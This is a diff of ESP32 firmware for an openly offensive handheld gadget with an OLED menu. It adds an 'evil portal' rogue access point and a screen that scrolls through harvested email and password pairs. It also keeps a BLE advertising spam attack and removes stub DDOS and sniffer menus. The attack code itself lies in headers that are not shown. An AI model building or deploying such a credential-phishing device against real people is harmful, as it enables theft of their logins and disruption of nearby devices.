@@ -8,8 +8,9 @@
 #include "font8x8_basic.h"
 #include "driver/gpio.h"
 
-// BLE
+// custom headers
 #include "ble.h"
+#include "captive_portal.h"
 
 // screen
 #define tag "SSD1306"
@@ -18,56 +19,146 @@
 #define BUTTON_PIN1 26
 #define BUTTON_PIN2 25
 #define BUTTON_PIN3 27
-#define LED_PIN 2 // led
+#define LED_PIN 2 
 
 #define DEBOUNCE_TIME 200 / portTICK_PERIOD_MS
 
-// struct for use of menu navigation
+// menu tree node - move to header
 typedef struct MenuNode {
 	char* options[10];
 	int num_options;
 	struct MenuNode** children;
 	int num_children;
 	struct MenuNode* parent;
-	void (*actions[10])(void); // limit of 4 functions per menu
+	void (*actions[10])(SSD1306_t *dev);
 } MenuNode;
+
+ListNode* harvested_data_head = NULL;
 
 
 MenuNode mainMenu;
 MenuNode wifiSettings;
 MenuNode evilPortalSettings;
-MenuNode ddosSettings;
-MenuNode snifferSettings;
 MenuNode bluetoothSettings;
+MenuNode* currentMenu;
+int selected_index;
 
-// TODO refactor active mode functions to other files with their own CMake
-void start_evil_portal() {
-    gpio_set_level(LED_PIN, 1);
-    ESP_LOGI(tag, "Starting Evil AP mode...");
-	ESP_LOGI(tag, "LED current level: %d", gpio_get_level(LED_PIN));  
+// function declarations: move to a header file
+void exit_ble_mode(SSD1306_t *dev);
+void display_menu(SSD1306_t *dev, MenuNode* currentMenu, int selected_index);
+
+bool read_button(int pin) {
+	return gpio_get_level(pin) == 0; // button pressed
 }
 
-void start_ble_spam_attack() {
+void start_evil_portal(SSD1306_t *dev) {
+    gpio_set_level(LED_PIN, 1);
+    ESP_LOGI(tag, "Starting Evil AP mode...");
+	captive_portal_main();
+}
+
+//  helper function to chunk node data into sized lines on screen
+int display_chunked_text(SSD1306_t *dev, const char* text, int start_line, int max_lines) {
+    int line = start_line;
+    int len = strlen(text);
+    
+    for (int i = 0; i < len && line < max_lines; i += 16) {
+        char chunk[17]; // 16 chars + null
+        strncpy(chunk, &text[i], 16);
+        chunk[16] = '\0'; // null-terminate manually
+        ssd1306_display_text(dev, line++, chunk, strlen(chunk), false);
+    }
+
+    return line; // return the next available line index
+}
+
+void show_ap_harvest(SSD1306_t *dev) {
+	int selected_index = 0;
+    ListNode* current = harvested_data_head;
+	MenuNode* returnMenu = &evilPortalSettings;
+
+    int total_entries = 0;
+    ListNode* tmp = harvested_data_head;
+    while (tmp != NULL) {
+        total_entries++;
+        tmp = tmp->next;
+    }
+
+	ssd1306_clear_screen(dev, false);
+    bool in_menu = true;
+    while (in_menu) {
+        if (current == NULL) {
+            ssd1306_display_text(dev, 4, "No Data", 7, false);
+        } else {
+            ListNode* ptr = harvested_data_head;
+            int i = 0;
+            while (i < selected_index && ptr != NULL) {
+                ptr = ptr->next;
+                i++;
+            }
+
+            if (ptr != NULL) {
+                int line = 0;
+                line = display_chunked_text(dev, ptr->data.email, line, 8);
+                line = display_chunked_text(dev, ptr->data.password, line, 8);
+            }
+        }
+
+        // Show "Exit" if scrolled past last item
+        if (selected_index >= total_entries) {
+            ssd1306_display_text(dev, 0, "> Exit", 6, true);
+        }
+
+        vTaskDelay(DEBOUNCE_TIME);
+
+        // Input handling
+        if (read_button(BUTTON_PIN2)) {  // UP
+			ssd1306_clear_screen(dev, false);
+			ssd1306_contrast(dev, 0xff);
+            selected_index--;
+            if (selected_index < 0) selected_index = 0;
+        }
+
+        if (read_button(BUTTON_PIN3)) {  // DOWN
+			ssd1306_clear_screen(dev, false);
+			ssd1306_contrast(dev, 0xff);
+            selected_index++;
+            if (selected_index > total_entries) selected_index = total_entries;
+        }
+
+        if (read_button(BUTTON_PIN1)) {  // SELECT
+			ssd1306_clear_screen(dev, false);
+			ssd1306_contrast(dev, 0xff);
+            if (selected_index >= total_entries) {
+                // Exit option selected
+                in_menu = false;
+                currentMenu = returnMenu;
+                display_menu(dev, currentMenu, 0);
+            }
+        }
+    }
+}
+
+void start_ble_spam_attack(SSD1306_t *dev) {
     gpio_set_level(LED_PIN, 1); 
     ESP_LOGI(tag, "Starting spam attack...");
 	ble_advertise();
 }
 
 // ddos
-void start_ddos_attack() {
+void start_ddos_attack(SSD1306_t *dev) {
     gpio_set_level(LED_PIN, 1); 
     ESP_LOGI(tag, "Starting DDOS attack...");
-	ESP_LOGI(tag, "LED current level: %d", gpio_get_level(LED_PIN));  
 }
 
 // packet sniffer
-void start_packet_sniffer() {
+void start_packet_sniffer(SSD1306_t *dev) {
     gpio_set_level(LED_PIN, 1); 
     ESP_LOGI(tag, "Starting packet sniffer...");
-	ESP_LOGI(tag, "LED current level: %d", gpio_get_level(LED_PIN));  
 }
+
 // TODO: cancel active mode if exit is pressed
-void exit_menu() {
+void exit_ble_mode(SSD1306_t *dev) {
     gpio_set_level(LED_PIN, 0); 
     ESP_LOGI(tag, "Exiting menu...");
 	esp_err_t ret = esp_ble_gap_stop_advertising();
@@ -78,42 +169,35 @@ void exit_menu() {
     }
 }
 
+void exit_ap_mode(SSD1306_t *dev) {
+    gpio_set_level(LED_PIN, 0); 
+    ESP_LOGI(tag, "Exiting menu...");
+	stop_captive_portal(); // add error handle
+}
+
+void exit_menu(SSD1306_t *dev) {
+	gpio_set_level(LED_PIN, 0); 
+    ESP_LOGI(tag, "Exiting menu...");
+}
+
 MenuNode evilPortalSettings = {
 	.options = {"start evil AP", "data", "options", "exit"},
 	.num_options = 4,
 	.children = NULL, 
 	.num_children = 0,
 	.parent = &wifiSettings,
-	.actions = { start_evil_portal, NULL, NULL, exit_menu } // add this later for exit, and start 
+	.actions = { start_evil_portal, show_ap_harvest, NULL, exit_ap_mode } 
 };
 
-MenuNode ddosSettings = {
-	.options = {"start DDOS", "options", "exit"},
-	.num_options = 3,
-	.children = NULL, 
-	.num_children = 0,
-	.parent = &wifiSettings,
-	.actions = { start_ddos_attack, NULL, exit_menu } // add this later for exit, and start 
-};
-
-MenuNode snifferSettings = {
-	.options = {"start sniffing", "dump", "options", "exit"},
-	.num_options = 4,
-	.children = NULL,
-	.num_children = 0,
-	.parent = &wifiSettings,
-	.actions = { start_packet_sniffer, NULL, NULL, exit_menu } // add this later for exit, and start 
-};
-
-MenuNode* wifiChildren[] = { &evilPortalSettings, &ddosSettings, &snifferSettings };
+MenuNode* wifiChildren[] = { &evilPortalSettings };
 
 MenuNode wifiSettings = {
-	.options = {"evil portal", "DDOS attack", "packet sniffer", "exit"},
-	.num_options = 4,
+	.options = {"evil portal", "exit"},
+	.num_options = 2,
 	.children = wifiChildren,
-	.num_children = 3,
+	.num_children = 1,
 	.parent = &mainMenu,
-	.actions = { NULL, NULL, NULL, exit_menu } // add this later for exit, and start 
+	.actions = { NULL, exit_menu } 
 };
 
 MenuNode bluetoothSettings = {
@@ -122,7 +206,7 @@ MenuNode bluetoothSettings = {
 	.children = NULL, 
 	.num_children = 0,
 	.parent = &mainMenu,
-	.actions = { start_ble_spam_attack, NULL, NULL, exit_menu } // add this later for exit and start
+	.actions = { start_ble_spam_attack, NULL, NULL, exit_ble_mode } 
 };
 
 MenuNode* mainMenuChildren[] = { &wifiSettings, &bluetoothSettings };
@@ -133,7 +217,7 @@ MenuNode mainMenu = {
 	.children = mainMenuChildren, 
 	.num_children = 2,
 	.parent = NULL,
-	.actions = { NULL, NULL } // stays null since this is just the head menu in tree
+	.actions = { NULL, NULL } 
 };
 
 void display_menu(SSD1306_t *dev, MenuNode* currentMenu, int selected_index) {
@@ -153,20 +237,22 @@ void display_menu(SSD1306_t *dev, MenuNode* currentMenu, int selected_index) {
 	}
 }
 
-bool read_button(int pin) {
-	return gpio_get_level(pin) == 0; // button pressed
-}
-
-// menu traverse tree
+// traverse menu tree
 void handle_menu_nav(SSD1306_t *dev, MenuNode** currentMenu, int* selected_index) {
-	if (read_button(BUTTON_PIN1)) {
+	if (read_button(BUTTON_PIN1)) { // select button
 		if ((*currentMenu)->children != NULL) {
 			(*currentMenu) = (*currentMenu)->children[*selected_index];
 		} else if ((*currentMenu)->actions[*selected_index] != NULL) {
-			(*currentMenu)->actions[*selected_index](); // run function at index
+			(*currentMenu)->actions[*selected_index](dev); // run function at index
 
-			if ((*currentMenu)->actions[*selected_index] == exit_menu) {
+			// if function is an exit option then move to parent menu
+			if ((*currentMenu)->actions[*selected_index] == exit_ble_mode || 
+				(*currentMenu)->actions[*selected_index] == exit_ap_mode || 
+				(*currentMenu)->actions[*selected_index] == exit_menu
+			) 
+			{
 				(*currentMenu) = (*currentMenu)->parent;
+				*selected_index = 0;
 			}
 		} 
 		display_menu(dev, *currentMenu, *selected_index);
@@ -225,10 +311,13 @@ void app_main(void)
 	// intro screen
 	ssd1306_clear_screen(&dev, false);
 	ssd1306_contrast(&dev, 0xff);
-	ssd1306_display_text(&dev, 0, "macero", 6, false);
+	ssd1306_display_text(&dev, 1, "__  _  _ _ ___ ", 16, false);
+	ssd1306_display_text(&dev, 2, "|||(_|(_(/_|(_)", 16, false);
+
 	vTaskDelay(3000 / portTICK_PERIOD_MS);
 
-	MenuNode *currentMenu = &mainMenu;
+	currentMenu = &mainMenu;
+	selected_index = 0;
 
 	display_menu(&dev, currentMenu, selected_index);
 
